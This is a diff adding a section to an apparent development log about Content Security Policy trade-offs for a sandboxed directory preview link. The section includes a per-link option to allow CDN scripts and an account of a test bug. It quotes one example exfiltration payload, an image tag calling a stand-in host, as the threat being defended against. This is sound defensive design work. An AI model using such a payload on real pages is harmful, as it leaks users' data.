@@ -20655,3 +20655,53 @@ What is still unknown is which device and which mode the bands are on. The
 screenshot is Android Chrome; the report says iPad. Those are two different
 mechanisms with two different fixes, and guessing between them is what the last
 three rounds were.
+
+## A preview that may reach a CDN, if the link says so
+
+「预览的时候好像会报错好多」, with a console full of them. Two kinds, and only
+one is ours: the `content-script.bundle.js` and `injected.js` failures are the
+reader's own browser extensions losing `localStorage` because the document is
+sandboxed, which is the same sandbox that stops a preview reading the panel's
+session. The ones that matter are these:
+
+	Loading the stylesheet 'https://fonts.googleapis.com/...' violates ... style-src
+	Loading the script 'https://cdnjs.cloudflare.com/.../three.min.js' violates ... script-src
+	Uncaught ReferenceError: THREE is not defined
+
+That is `dirPreviewCSP` doing exactly what it was written to do, and this log
+records the reasoning: 「Nothing outbound. A preview holding
+`<img src="https://someone/?leak">` must make no request」. What it did not
+account for is what gets previewed. A page an agent has just written pulls
+three.js off a CDN and a font off Google as a matter of course, so the policy
+that makes a link safe to hand out is also the one that renders the thing you
+wanted to look at blank.
+
+Per link, off by default, chosen when the link is made. Not a global setting:
+it changes what one token can do, and a setting would change it for links
+already handed out.
+
+What it costs is written down rather than implied. A script fetched from
+anywhere can put anything in its own URL, so a page that may load one is a page
+that may send the directory somewhere. `connect-src` stays `'none'` in both
+modes, which closes the obvious road and not the clever ones — it is not what
+keeps this safe, and the comment says so rather than letting a reader assume it
+does. What does not move in either mode is the half that protects the *panel*:
+the sandbox, the opaque origin it produces, `base-uri 'none'` and
+`frame-ancestors`. No link setting can reach those, and the test checks both
+halves.
+
+The test for it was wrong first, in a way worth keeping: it asked whether a
+directive `strings.Contains` `"https:"` — and the panel's own origin *is*
+`https://panel...`, so every clause matched in both modes and the closed policy
+reported as open. It compares tokens now.
+
+A menu rather than one press, and rather than a modifier key: a preview is
+opened on a phone as often as on a desktop, and there is nothing to hold down
+there. The safe item is first and the other one says what it costs underneath
+it.
+
+No browser check drives this button — before or after. `previewMenu.test.ts`
+says so out loud rather than leaving it to be discovered, and pins the wiring by
+reading the source: which item passes which flag, and that the menu closes
+before the link is made, since a menu left open over the next directory makes a
+link for a path that is no longer on screen.
